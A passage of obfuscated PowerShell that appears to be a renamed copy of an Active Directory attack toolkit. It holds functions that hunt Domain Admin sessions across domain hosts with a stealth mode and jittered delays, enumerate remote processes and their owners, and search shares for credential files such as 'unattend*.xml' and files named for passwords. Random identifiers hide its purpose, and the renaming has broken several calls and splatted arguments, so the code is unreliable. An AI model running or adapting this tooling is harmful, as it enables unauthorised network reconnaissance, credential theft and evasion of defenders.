                        $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'User' $Owner.User
                        $SX9cIUZNlgUXvEw
                    }
                }
                catch {
                    Write-Verbose "[!] Error enumerating remote processes, access likely denied: $_"
                }
            }
            else {
                Write-Warning "[!] RemotePassword must also be supplied!"
            }
        }
        else {

            try {
                Get-WMIobject -Class Win32_process -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ | ForEach-Object {
                    $Owner = $_.getowner();
                    $SX9cIUZNlgUXvEw = New-Object PSObject
                    $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'ComputerName' $kEneZcxTTiuFrPZ
                    $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'User' $Owner.User
                    $SX9cIUZNlgUXvEw
                }
            }
            catch {
                Write-Verbose "[!] Error enumerating remote processes, access likely denied: $_"
            }
        }
    }
}


function gaff {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = '.\',

        [String[]]
        $Terms,

        [Switch]
        $riCBkWMeCacicWG,

        [Switch]
        $FhVGYZdNhIhylqU,

        [String]
        $yKEKDEW9PeJTjYe,

        [String]
        $xowyxDubqhcQHpm,

        [String]
        $RoTJ99UvZI9HsRv,

        [Switch]
        $c9dVYer9XyZIDWI,

        [Switch]
        $BXdeapZeYZBWfuJ,

        [Switch]
        $fsGmbzVQbOienMv,

        [String]
        $piSVdrubQFOiYrj,

        [Switch]
        $9MCpeEay99VfrvP,

        [System.Management.Automation.PSCredential]
        $zbH9gtWqoSKXB9I = [System.Management.Automation.PSCredential]::Empty
    )

    begin {

        $FoTKoPPrIPFFiOs = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')

        if(!$Path.EndsWith('\')) {
            $Path = $Path + '\'
        }
        if($zbH9gtWqoSKXB9I -ne [System.Management.Automation.PSCredential]::Empty) { $9MCpeEay99VfrvP = $True }


        if ($Terms) {
            if($Terms -isnot [system.array]) {
                $Terms = @($Terms)
            }
            $FoTKoPPrIPFFiOs = $Terms
        }

        if(-not $FoTKoPPrIPFFiOs[0].startswith("*")) {

            for ($i = 0; $i -lt $FoTKoPPrIPFFiOs.Count; $i++) {
                $FoTKoPPrIPFFiOs[$i] = "*$($FoTKoPPrIPFFiOs[$i])*"
            }
        }


        if ($riCBkWMeCacicWG) {
            $FoTKoPPrIPFFiOs = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }


        if($FhVGYZdNhIhylqU) {

            $yKEKDEW9PeJTjYe = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
            $FoTKoPPrIPFFiOs = '*.exe'
        }

        if($9MCpeEay99VfrvP) {

            $Parts = $Path.split('\')
            $lsDCwNmlDuPYL9m = $Parts[0..($Parts.length-2)] -join '\'
            $QQxmdPmFgnSXPuF = $Parts[-1]
            $stuyr9AcTK99icR = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose "Mounting path $Path using a temp PSDrive at $stuyr9AcTK99icR"

            try {
                $Null = New-PSDrive -Name $stuyr9AcTK99icR -zbH9gtWqoSKXB9I $zbH9gtWqoSKXB9I -PSProvider FileSystem -Root $lsDCwNmlDuPYL9m -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path $Path : $_"
                return $Null
            }


            $Path = $stuyr9AcTK99icR + ":\" + $QQxmdPmFgnSXPuF
        }
    }

    process {

        Write-Verbose "[*] Search path $Path"

        function toreador {

            [CmdletBinding()]param([String]$Path)
            try {
                $ugJyXsERjyY99wM = [IO.FILE]::OpenWrite($Path)
                $ugJyXsERjyY99wM.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }

        $WetgmKRSgytEcQw =  @{
            'Path' = $Path
            'Recurse' = $True
            'Force' = $(-not $BXdeapZeYZBWfuJ)
            'Include' = $FoTKoPPrIPFFiOs
            'ErrorAction' = 'SilentlyContinue'
        }

        Get-ChildItem @SearchArgs | ForEach-Object {
            Write-Verbose $_

            if(!$c9dVYer9XyZIDWI -or !$_.PSIsContainer) {$_}
        } | ForEach-Object {
            if($yKEKDEW9PeJTjYe -or $xowyxDubqhcQHpm -or $RoTJ99UvZI9HsRv) {
                if($yKEKDEW9PeJTjYe -and ($_.LastAccessTime -gt $yKEKDEW9PeJTjYe)) {$_}
                elseif($xowyxDubqhcQHpm -and ($_.LastWriteTime -gt $xowyxDubqhcQHpm)) {$_}
                elseif($RoTJ99UvZI9HsRv -and ($_.CreationTime -gt $RoTJ99UvZI9HsRv)) {$_}
            }
            else {$_}
        } | ForEach-Object {

            if((-not $fsGmbzVQbOienMv) -or (toreador -Path $_.FullName)) {$_}
        } | Select-Object FullName,@{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | ForEach-Object {

            if($piSVdrubQFOiYrj) {flubbing -Zn9bDMjUbWFbrFK $_ -piSVdrubQFOiYrj $piSVdrubQFOiYrj}
            else {$_}
        }
    }

    end {
        if($9MCpeEay99VfrvP -and $stuyr9AcTK99icR) {
            Write-Verbose "Removing temp PSDrive $stuyr9AcTK99icR"
            Get-PSDrive -Name $stuyr9AcTK99icR -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}








function gamboled {

    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        $kEneZcxTTiuFrPZ,

        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        $wCnzjqnrBF9dvCj,

        [Parameter(Position=2)]
        [Hashtable]
        $JOSAHQ9v9JGmPBt,

        [Int]
        $rTpHnnlb99iPjvh = 20,

        [Switch]
        $bybIu9FcWQYFgRT
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }

        Write-Verbose "[*] Total number of hosts: $($kEneZcxTTiuFrPZ.count)"



        $yMuuIF9OTgV9LbM = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $yMuuIF9OTgV9LbM.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()



        if(!$bybIu9FcWQYFgRT) {


            $khCRmmWYJFJZdiL = Get-Variable -Scope 2


            $hy9YfTDcgOrZAaZ = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")


            ForEach($Var in $khCRmmWYJFJZdiL) {
                if($hy9YfTDcgOrZAaZ -NotContains $Var.Name) {
                $yMuuIF9OTgV9LbM.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }


            ForEach($Ft999Oh99lszpBv in (Get-ChildItem Function:)) {
                $yMuuIF9OTgV9LbM.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Ft999Oh99lszpBv.Name, $Ft999Oh99lszpBv.Definition))
            }
        }






        $Pool = [runspacefactory]::CreateRunspacePool(1, $rTpHnnlb99iPjvh, $yMuuIF9OTgV9LbM, $Host)
        $Pool.Open()

        $Jobs = @()
        $PS = @()
        $Wait = @()

        $Y9qMKSVLp9NbaEl = 0
    }

    process {

        ForEach ($SiEWnqfdNZWbTmF in $kEneZcxTTiuFrPZ) {


            if ($SiEWnqfdNZWbTmF -ne '') {


                While ($($Pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -MilliSeconds 500
                }


                $PS += [powershell]::create()

                $PS[$Y9qMKSVLp9NbaEl].runspacepool = $Pool


                $Null = $PS[$Y9qMKSVLp9NbaEl].AddScript($wCnzjqnrBF9dvCj).AddParameter('ComputerName', $SiEWnqfdNZWbTmF)
                if($JOSAHQ9v9JGmPBt) {
                    ForEach ($Param in $JOSAHQ9v9JGmPBt.GetEnumerator()) {
                        $Null = $PS[$Y9qMKSVLp9NbaEl].AddParameter($Param.Name, $Param.Value)
                    }
                }


                $Jobs += $PS[$Y9qMKSVLp9NbaEl].BeginInvoke();


                $Wait += $Jobs[$Y9qMKSVLp9NbaEl].AsyncWaitHandle
            }
            $Y9qMKSVLp9NbaEl = $Y9qMKSVLp9NbaEl + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $FxsyoaoHfZ9kaIf = Get-Date


        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $FxsyoaoHfZ9kaIf).totalSeconds) -gt 60) {
                Start-Sleep -MilliSeconds 500
            }


        for ($y = 0; $y -lt $Y9qMKSVLp9NbaEl; $y++) {

            try {

                $PS[$y].EndInvoke($Jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $PS[$y].Dispose()
            }
        }
        
        $Pool.Dispose()
        Write-Verbose "All threads completed!"
    }
}


function hawthorns {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $kEneZcxTTiuFrPZ,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $SCQMhcOm9CdDHJg,

        [String]
        $9vRumd9teqLmPVM,

        [String]
        $beLlanRpMptelSU,

        [Switch]
        $tXJXRLTbTAiviMb,

        [String]
        $hIqWczrXxNjFAmP = 'Domain Admins',

        [String]
        $uDgMtYjFIQxRGmL,

        [String]
        $IuM9ojehadqRMJF,

        [String]
        $UtmAb9UxgORICN9,

        [String]
        $p9WUcQfw9aClvtF,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $yzapkmRpSGxNBuy,

        [Switch]
        $IWQGvaMfQCkbauo,

        [Switch]
        $CAVdCnsrnxVjiLz,

        [Switch]
        $LCKvhCzyUSeRwmW,

        [Switch]
        $IfAbkqth9MjUGBa,

        [Switch]
        $Mt9YASUmJCaBvWu,

        [UInt32]
        $Delay = 0,

        [Double]
        $ptfOJoCXzpSnNCJ = .3,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $VnJraNO9NZROVGW,

        [Switch]
        $v9rPBuPmcvnoMAe,

        [Switch]
        $hvE9Blkh9J9DKeU,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $adPIZY99wrkuFiX ="All",

        [Switch]
        $NDbfAMkk9wTy9aN,

        [ValidateRange(1,100)] 
        [Int]
        $rTpHnnlb99iPjvh
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }


        $umE9IsWm9kKUGTC = New-Object System.Random

        Write-Verbose "[*] Running hawthorns with delay of $Delay"







        if($SCQMhcOm9CdDHJg) {

            $kEneZcxTTiuFrPZ = Get-Content -Path $SCQMhcOm9CdDHJg
        }

        if(!$kEneZcxTTiuFrPZ) { 
            [Array]$kEneZcxTTiuFrPZ = @()

            if($KKbtTlEQY9KtTfJ) {
                $CJ9kiLTwFu9AGol = @($KKbtTlEQY9KtTfJ)
            }
            elseif($v9rPBuPmcvnoMAe) {

                $CJ9kiLTwFu9AGol = misdirects | ForEach-Object { $_.Name }
            }
            else {

                $CJ9kiLTwFu9AGol = @( (skulked).name )
            }
            
            if($hvE9Blkh9J9DKeU) {
                Write-Verbose "Stealth mode! Enumerating commonly used servers"
                Write-Verbose "Stealth source: $adPIZY99wrkuFiX"

                ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                    if (($adPIZY99wrkuFiX -eq "File") -or ($adPIZY99wrkuFiX -eq "All")) {
                        Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for File Servers..."
                        $kEneZcxTTiuFrPZ += aqueduct -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv
                    }
                    if (($adPIZY99wrkuFiX -eq "DFS") -or ($adPIZY99wrkuFiX -eq "All")) {
                        Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for DFS Servers..."
                        $kEneZcxTTiuFrPZ += marinated -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv | ForEach-Object {$_.RemoteServerName}
                    }
                    if (($adPIZY99wrkuFiX -eq "DC") -or ($adPIZY99wrkuFiX -eq "All")) {
                        Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for Domain Controllers..."
                        $kEneZcxTTiuFrPZ += odometer -LDAP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv | ForEach-Object { $_.dnshostname}
                    }
                }
            }
            else {
                ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                    Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for hosts"

                    $ASTrTpJJOLHCvQs = @{
                        'Domain' = $KKbtTlEQY9KtTfJ
                        'DomainController' = $ewHsaEFeoXOCPPv
                        'ADSpath' = $GazxKCLDhxrDzgZ
                        'Filter' = $9vRumd9teqLmPVM
                        'Unconstrained' = $tXJXRLTbTAiviMb
                    }

                    $kEneZcxTTiuFrPZ += Randal @Arguments
                }
            }


            $kEneZcxTTiuFrPZ = $kEneZcxTTiuFrPZ | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($kEneZcxTTiuFrPZ.Count) -eq 0) {
                throw "No hosts found!"
            }
        }








        $UTTmFmFvggDWcqw = @()


        $dIElamIgZXYMDuK = ([Environment]::UserName).toLower()


        if($VnJraNO9NZROVGW -or $NDbfAMkk9wTy9aN) {
            $User = New-Object PSObject
            $User | Add-Member Noteproperty 'MemberDomain' $Null
            $User | Add-Member Noteproperty 'MemberName' '*'
            $UTTmFmFvggDWcqw = @($User)

            if($NDbfAMkk9wTy9aN) {

                $BCH9UxVkuRmPOfS = Myers -OADAUGURRbgtTDp "krbtgt@$($KKbtTlEQY9KtTfJ)"
                $pbHEsXgFLKVYimP = $BCH9UxVkuRmPOfS.split("\")[0]
            }
        }

        elseif($uDgMtYjFIQxRGmL) {
            Write-Verbose "Querying target server '$uDgMtYjFIQxRGmL' for local users"
            $UTTmFmFvggDWcqw = Brahms $uDgMtYjFIQxRGmL -Okpdr9DpyZPCXBG | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                $User = New-Object PSObject
                $User | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
                $User | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
                $User
            }  | Where-Object {$_}
        }

        elseif($IuM9ojehadqRMJF) {
            Write-Verbose "[*] Using target user '$IuM9ojehadqRMJF'..."
            $User = New-Object PSObject
            if($CJ9kiLTwFu9AGol) {
                $User | Add-Member Noteproperty 'MemberDomain' $CJ9kiLTwFu9AGol[0]
            }
            else {
                $User | Add-Member Noteproperty 'MemberDomain' $Null
            }
            $User | Add-Member Noteproperty 'MemberName' $IuM9ojehadqRMJF.ToLower()
            $UTTmFmFvggDWcqw = @($User)
        }

        elseif($yzapkmRpSGxNBuy) {
            $UTTmFmFvggDWcqw = Get-Content -Path $yzapkmRpSGxNBuy | ForEach-Object {
                $User = New-Object PSObject
                if($CJ9kiLTwFu9AGol) {
                    $User | Add-Member Noteproperty 'MemberDomain' $CJ9kiLTwFu9AGol[0]
                }
                else {
                    $User | Add-Member Noteproperty 'MemberDomain' $Null
                }
                $User | Add-Member Noteproperty 'MemberName' $_
                $User
            }  | Where-Object {$_}
        }
        elseif($p9WUcQfw9aClvtF -or $UtmAb9UxgORICN9 -or $IWQGvaMfQCkbauo) {
            ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {

                $ASTrTpJJOLHCvQs = @{
                    'Domain' = $KKbtTlEQY9KtTfJ
                    'DomainController' = $ewHsaEFeoXOCPPv
                    'ADSpath' = $p9WUcQfw9aClvtF
                    'Filter' = $UtmAb9UxgORICN9
                    'AdminCount' = $IWQGvaMfQCkbauo
                    'AllowDelegation' = $CAVdCnsrnxVjiLz
                }

                Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for users"
                $UTTmFmFvggDWcqw += Houyhnhnm @Arguments | ForEach-Object {
                    $User = New-Object PSObject
                    $User | Add-Member Noteproperty 'MemberDomain' $KKbtTlEQY9KtTfJ
                    $User | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $User
                }  | Where-Object {$_}

            }            
        }
        else {
            ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for users of group '$hIqWczrXxNjFAmP'"
                $UTTmFmFvggDWcqw += confessedly -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv
            }
        }

        if (( (-not $VnJraNO9NZROVGW) -and (-not $NDbfAMkk9wTy9aN) ) -and ((!$UTTmFmFvggDWcqw) -or ($UTTmFmFvggDWcqw.Count -eq 0))) {
            throw "[!] No users found to search for!"
        }


        $bn9LRoFkAwqTApM = {
            param($kEneZcxTTiuFrPZ, $Ping, $UTTmFmFvggDWcqw, $dIElamIgZXYMDuK, $hvE9Blkh9J9DKeU, $pbHEsXgFLKVYimP)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
            }
            if($Up) {
                if(!$pbHEsXgFLKVYimP) {

                    $ggsHN9EClCgCSbo = was -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
                    ForEach ($fdHIlzsnD9ctPye in $ggsHN9EClCgCSbo) {
                        $IuM9ojehadqRMJF = $fdHIlzsnD9ctPye.sesi10_username
                        $CName = $fdHIlzsnD9ctPye.sesi10_cname

                        if($CName -and $CName.StartsWith("\\")) {
                            $CName = $CName.TrimStart("\")
                        }


                        if (($IuM9ojehadqRMJF) -and ($IuM9ojehadqRMJF.trim() -ne '') -and (!($IuM9ojehadqRMJF -match $dIElamIgZXYMDuK))) {

                            $UTTmFmFvggDWcqw | Where-Object {$IuM9ojehadqRMJF -like $_.MemberName} | ForEach-Object {

                                $IP = biochemists -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
                                $NwPRBNdEjjkTFnj = New-Object PSObject
                                $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'UserDomain' $_.MemberDomain
                                $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'UserName' $IuM9ojehadqRMJF
                                $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'ComputerName' $kEneZcxTTiuFrPZ
                                $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'IP' $IP
                                $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'SessionFrom' $CName


                                if ($LCKvhCzyUSeRwmW) {
                                    $Admin = birdwatcher -kEneZcxTTiuFrPZ $CName
                                    $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'LocalAdmin' $Admin
                                }
                                else {
                                    $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $NwPRBNdEjjkTFnj
                            }
                        }                                    
                    }
                }
                if(!$hvE9Blkh9J9DKeU) {

                    $KjOHBc9vSHftOAy = cherubs -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
                    ForEach ($User in $KjOHBc9vSHftOAy) {
                        $IuM9ojehadqRMJF = $User.wkui1_username


                        $EC9iKdhesKcX99B = $User.wkui1_logon_domain


                        if (($IuM9ojehadqRMJF) -and ($IuM9ojehadqRMJF.trim() -ne '')) {

                            $UTTmFmFvggDWcqw | Where-Object {$IuM9ojehadqRMJF -like $_.MemberName} | ForEach-Object {

                                $wT99HnAjFGHPIIR = $True
                                if($pbHEsXgFLKVYimP) {
                                    if ($pbHEsXgFLKVYimP.ToLower() -ne $EC9iKdhesKcX99B.ToLower()) {
                                        $wT99HnAjFGHPIIR = $True
                                    }
                                    else {
                                        $wT99HnAjFGHPIIR = $False
                                    }
                                }
                                if($wT99HnAjFGHPIIR) {
                                    $IP = biochemists -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
                                    $NwPRBNdEjjkTFnj = New-Object PSObject
                                    $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'UserDomain' $EC9iKdhesKcX99B
                                    $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'UserName' $IuM9ojehadqRMJF
                                    $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'ComputerName' $kEneZcxTTiuFrPZ
                                    $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'IP' $IP
                                    $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'SessionFrom' $Null


                                    if ($LCKvhCzyUSeRwmW) {
                                        $Admin = birdwatcher -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
                                        $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'LocalAdmin' $Admin
                                    }
                                    else {
                                        $NwPRBNdEjjkTFnj | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $NwPRBNdEjjkTFnj
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($rTpHnnlb99iPjvh) {
            Write-Verbose "Using threading with threads = $rTpHnnlb99iPjvh"


            $RKqdPQDaOeQqZwY = @{
                'Ping' = $(-not $Mt9YASUmJCaBvWu)
                'TargetUsers' = $UTTmFmFvggDWcqw
                'CurrentUser' = $dIElamIgZXYMDuK
                'Stealth' = $hvE9Blkh9J9DKeU
                'DomainShortName' = $pbHEsXgFLKVYimP
            }


            gamboled -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -JOSAHQ9v9JGmPBt $RKqdPQDaOeQqZwY
        }

        else {
            if(-not $Mt9YASUmJCaBvWu -and ($kEneZcxTTiuFrPZ.count -ne 1)) {

                $Ping = {param($kEneZcxTTiuFrPZ) if(Test-Connection -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -Count 1 -Quiet -ErrorAction Stop){$kEneZcxTTiuFrPZ}}
                $kEneZcxTTiuFrPZ = gamboled -bybIu9FcWQYFgRT -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $Ping -rTpHnnlb99iPjvh 100
            }

            Write-Verbose "[*] Total number of active hosts: $($kEneZcxTTiuFrPZ.count)"
            $Y9qMKSVLp9NbaEl = 0

            ForEach ($SiEWnqfdNZWbTmF in $kEneZcxTTiuFrPZ) {

                $Y9qMKSVLp9NbaEl = $Y9qMKSVLp9NbaEl + 1


                Start-Sleep -Seconds $umE9IsWm9kKUGTC.Next((1-$ptfOJoCXzpSnNCJ)*$Delay, (1+$ptfOJoCXzpSnNCJ)*$Delay)

                Write-Verbose "[*] Enumerating server $SiEWnqfdNZWbTmF ($Y9qMKSVLp9NbaEl of $($kEneZcxTTiuFrPZ.count))"
                $txcsRvewcVdZtUk = Invoke-Command -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -ArgumentList $SiEWnqfdNZWbTmF, $False, $UTTmFmFvggDWcqw, $dIElamIgZXYMDuK, $hvE9Blkh9J9DKeU, $pbHEsXgFLKVYimP
                $txcsRvewcVdZtUk

                if($txcsRvewcVdZtUk -and $IfAbkqth9MjUGBa) {
                    Write-Verbose "[*] Target user found, returning early"
                    return
                }
            }
        }

    }
}


function Hanukkah {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $kEneZcxTTiuFrPZ,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $SCQMhcOm9CdDHJg,

        [String]
        $9vRumd9teqLmPVM,

        [String]
        $beLlanRpMptelSU,

        [String]
        $hIqWczrXxNjFAmP = 'Domain Admins',

        [String]
        $uDgMtYjFIQxRGmL,

        [String]
        $IuM9ojehadqRMJF,

        [String]
        $UtmAb9UxgORICN9,

        [String]
        $p9WUcQfw9aClvtF,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $yzapkmRpSGxNBuy,

        [Switch]
        $LCKvhCzyUSeRwmW,

        [Switch]
        $IfAbkqth9MjUGBa,

        [Switch]
        $Mt9YASUmJCaBvWu,

        [UInt32]
        $Delay = 0,

        [Double]
        $ptfOJoCXzpSnNCJ = .3,

        [String]
        $KKbtTlEQY9KtTfJ,

        [Switch]
        $VnJraNO9NZROVGW,

        [Switch]
        $v9rPBuPmcvnoMAe,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $adPIZY99wrkuFiX ="All"
    )

    hawthorns -hvE9Blkh9J9DKeU @PSBoundParameters
}


function woodiest {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $kEneZcxTTiuFrPZ,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $SCQMhcOm9CdDHJg,

        [String]
        $9vRumd9teqLmPVM,

        [String]
        $beLlanRpMptelSU,

        [String]
        $STInHftm9uaqEql,

        [String]
        $hIqWczrXxNjFAmP = 'Domain Admins',

        [String]
        $uDgMtYjFIQxRGmL,

        [String]
        $IuM9ojehadqRMJF,

        [String]
        $UtmAb9UxgORICN9,

        [String]
        $p9WUcQfw9aClvtF,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $yzapkmRpSGxNBuy,

        [String]
        $ozIEgLP9yBLONTb,

        [String]
        $qmPjaAatXLPifFS,

        [Switch]
        $IfAbkqth9MjUGBa,

        [Switch]
        $Mt9YASUmJCaBvWu,

        [UInt32]
        $Delay = 0,

        [Double]
        $ptfOJoCXzpSnNCJ = .3,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $VnJraNO9NZROVGW,

        [Switch]
        $v9rPBuPmcvnoMAe,

        [ValidateRange(1,100)] 
        [Int]
        $rTpHnnlb99iPjvh
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }


        $umE9IsWm9kKUGTC = New-Object System.Random

        Write-Verbose "[*] Running woodiest with delay of $Delay"








        if($SCQMhcOm9CdDHJg) {
            $kEneZcxTTiuFrPZ = Get-Content -Path $SCQMhcOm9CdDHJg
        }

        if(!$kEneZcxTTiuFrPZ) { 
            [array]$kEneZcxTTiuFrPZ = @()

            if($KKbtTlEQY9KtTfJ) {
                $CJ9kiLTwFu9AGol = @($KKbtTlEQY9KtTfJ)
            }
            elseif($v9rPBuPmcvnoMAe) {

                $CJ9kiLTwFu9AGol = misdirects | ForEach-Object { $_.Name }
            }
            else {

                $CJ9kiLTwFu9AGol = @( (skulked).name )
            }

            ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for hosts"
                $kEneZcxTTiuFrPZ += Randal -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -DshCfudiWKUrQer $9vRumd9teqLmPVM -GazxKCLDhxrDzgZ $beLlanRpMptelSU
            }
        

            $kEneZcxTTiuFrPZ = $kEneZcxTTiuFrPZ | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($kEneZcxTTiuFrPZ.Count) -eq 0) {
                throw "No hosts found!"
            }
        }







        if(!$STInHftm9uaqEql) {
            Write-Verbose "No process name specified, building a target user set"


            $UTTmFmFvggDWcqw = @()


            if($uDgMtYjFIQxRGmL) {
                Write-Verbose "Querying target server '$uDgMtYjFIQxRGmL' for local users"
                $UTTmFmFvggDWcqw = Brahms $uDgMtYjFIQxRGmL -Okpdr9DpyZPCXBG | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                    ($_.AccountName).split("/")[1].toLower()
                }  | Where-Object {$_}
            }

            elseif($IuM9ojehadqRMJF) {
                Write-Verbose "[*] Using target user '$IuM9ojehadqRMJF'..."
                $UTTmFmFvggDWcqw = @( $IuM9ojehadqRMJF.ToLower() )
            }

            elseif($yzapkmRpSGxNBuy) {
                $UTTmFmFvggDWcqw = Get-Content -Path $yzapkmRpSGxNBuy | Where-Object {$_}
            }
            elseif($p9WUcQfw9aClvtF -or $UtmAb9UxgORICN9) {
                ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                    Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for users"
                    $UTTmFmFvggDWcqw += Houyhnhnm -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $p9WUcQfw9aClvtF -DshCfudiWKUrQer $UtmAb9UxgORICN9 | ForEach-Object {
                        $_.samaccountname
                    }  | Where-Object {$_}
                }            
            }
            else {
